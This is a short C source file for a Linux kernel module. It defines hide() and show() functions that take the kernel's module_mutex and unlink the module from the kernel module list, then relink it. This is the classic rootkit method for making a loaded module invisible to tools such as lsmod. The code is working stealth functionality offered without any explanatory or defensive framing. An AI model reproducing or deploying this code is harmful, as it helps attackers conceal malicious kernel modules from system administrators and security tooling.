//
// Created by black on 22-10-12.
//

#include "module.h"
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/mutex.h>

static struct list_head *mod_pre;

void hide(void) {
    while (!mutex_trylock(&module_mutex))
        cpu_relax();
    mod_pre = THIS_MODULE->list.prev;
    list_del(mod_pre->next);
    mutex_unlock(&module_mutex);
}

void show(void) {
    while (!mutex_trylock(&module_mutex))
        cpu_relax();
    list_add(&THIS_MODULE->list, mod_pre);
    mutex_unlock(&module_mutex);
}
